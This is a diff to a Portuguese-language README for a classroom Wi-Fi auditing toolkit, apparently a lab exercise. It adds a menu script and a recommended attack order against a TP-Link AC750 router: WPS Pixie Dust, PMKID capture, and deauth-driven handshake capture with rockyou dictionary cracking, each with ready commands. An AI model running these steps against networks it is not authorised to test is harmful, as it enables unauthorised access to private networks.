@@ -13,8 +13,36 @@ disponibilizado pelo professor em laboratório.
 
 | Arquivo | Função | Onde roda |
 |---|---|---|
+| `wifi_audit.sh` | **Menu central** que une tudo, pré-configurado para o TP-Link AC750 | **Kali Linux** |
 | `wifi_recon.py` | Extrai SSID, BSSID, canal, frequência, banda, criptografia e IP do gateway | **Windows e Linux** (Python 3, sem dependências externas) |
-| `wifi_crack.sh` | Orquestra captura de handshake/PMKID + quebra por dicionário | **Kali Linux** (aircrack-ng/hashcat) |
+| `wifi_crack.sh` | Orquestra WPS (Pixie Dust) / handshake / PMKID + quebra por dicionário | **Kali Linux** (aircrack-ng/reaver/hashcat) |
+
+## Início rápido (Kali)
+
+```bash
+sudo apt update && sudo apt install -y aircrack-ng hcxdumptool hcxtools \
+     hashcat reaver pixiewps
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+sudo ./wifi_audit.sh          # abre o menu com a ordem de ataque recomendada
+```
+
+## Alvo da atividade: TP-Link AC750 (Archer C20)
+
+| Característica | Valor padrão |
+|---|---|
+| Bandas | 2.4 GHz (canais 1–13) e 5 GHz (canais 36+) |
+| Criptografia | WPA/WPA2-PSK (AES/CCMP) |
+| Gateway | `192.168.0.1` (login `admin`/`admin`) |
+| SSID de fábrica | `TP-Link_XXXX` |
+| WPS | normalmente **ativo** e, em firmwares antigos, vulnerável a **Pixie Dust** (só na banda 2.4 GHz) |
+
+**Ordem de ataque recomendada** (do mais rápido ao mais lento):
+
+1. **WPS Pixie Dust** — `sudo ./wifi_crack.sh -i wlan0 -m wps` — recupera o PIN do WPS offline e, com ele, a senha WPA. Pode levar segundos. É o vetor clássico contra TP-Link; use o **BSSID de 2.4 GHz**.
+2. **PMKID** — `sudo ./wifi_crack.sh -i wlan0 -m pmkid` — rápido e não precisa de cliente conectado.
+3. **Handshake + dicionário** — `sudo ./wifi_crack.sh -i wlan0 -m handshake -b <BSSID> -c <canal>`.
+
+> Firmwares mais novos do Archer C20 fazem *lockout* do WPS após algumas tentativas. Se o Pixie Dust travar (`WPS pin not found` / `rate limiting`), parta para PMKID/handshake.
 
 ---
 
@@ -64,29 +92,32 @@ adaptador Wi-Fi USB compatível — chipset Atheros/Ralink/Realtek).
 Instale as dependências:
 
 ```bash
-sudo apt update && sudo apt install -y aircrack-ng hcxdumptool hcxtools hashcat
+sudo apt update && sudo apt install -y aircrack-ng hcxdumptool hcxtools \
+     hashcat reaver pixiewps
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # descompacta a wordlist
 ```
 
-Execute (guia passo a passo, escaneia e pede o alvo):
+Use o menu (mais simples):
 
 ```bash
-sudo ./wifi_crack.sh -i wlan0
+sudo ./wifi_audit.sh
 ```
 
-Ou já apontando o alvo:
+Ou chame um vetor direto:
 
 ```bash
+# WPS Pixie Dust (recomendado para TP-Link; use o BSSID de 2.4 GHz)
+sudo ./wifi_crack.sh -i wlan0 -m wps -b AA:BB:CC:DD:EE:FF -c 6
+
 # Handshake clássico (força reconexão de um cliente via deauth)
-sudo ./wifi_crack.sh -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6
+sudo ./wifi_crack.sh -i wlan0 -m handshake -b AA:BB:CC:DD:EE:FF -c 6
 
 # PMKID — funciona mesmo SEM nenhum cliente conectado ao modem
 sudo ./wifi_crack.sh -i wlan0 -m pmkid -b AA:BB:CC:DD:EE:FF -c 6
 ```
 
-O script faz, em ordem: modo monitor → scan → captura (handshake ou PMKID) →
-conversão → quebra por dicionário com `aircrack-ng`/`hashcat`. Ao sair, restaura
-a interface automaticamente.
+Cada vetor faz, em ordem: modo monitor → scan → ataque → recuperação da senha.
+Ao sair, a interface é restaurada automaticamente (`trap`).
 
 ---
 
